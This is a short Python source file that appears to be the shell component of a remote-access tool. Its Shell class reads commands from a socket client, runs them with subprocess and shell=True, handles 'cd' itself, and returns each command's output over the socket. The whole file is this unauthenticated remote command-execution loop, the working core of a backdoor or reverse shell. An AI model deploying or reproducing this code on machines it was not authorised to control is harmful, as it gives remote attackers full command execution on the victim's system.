#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : yyxzz
# @Software: PyCharm
# @Time    : 2020/8/17 11:03

import os
import subprocess
from misc.encoding import Encode

class Shell:
    def __init__(self, client, sendBufferSize = 4096, recvBufferSize = 8192):
        self.client = client
        self.sendBufferSize = sendBufferSize
        self.recvBufferSize = recvBufferSize

    def shell(self):
        while True:
            pwd = os.getcwd()
            title = "%s > " % (pwd)
            self.client.send(title.encode(Encode.encoding))
            cmd = self.client.recv(self.recvBufferSize).decode(Encode.encoding)
            if cmd in ["quit", "exit", "q"]:
                return 0
            try:
                if cmd[:2] == "cd":
                    os.chdir(cmd[3:])
                    self.client.send(cmd.encode(Encode.encoding))
                elif cmd[1] == ":":
                    os.chdir(cmd)
                    self.client.send(cmd.encode(Encode.encoding))
                else:
                    result = subprocess.run(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    # 判断成功执行与否，及stdout是否为空
                    if result.returncode == 0:
                        self.client.send(result.stdout) if len(result.stdout) != 0 else self.client.send(cmd.encode(Encode.encoding))
                    else:
                        self.client.send(result.stderr)
            except FileNotFoundError:
                self.client.send("No Such File or Directory !".encode(Encode.encoding))
            except:
                self.client.send("An ERROR !".encode(Encode.encoding))
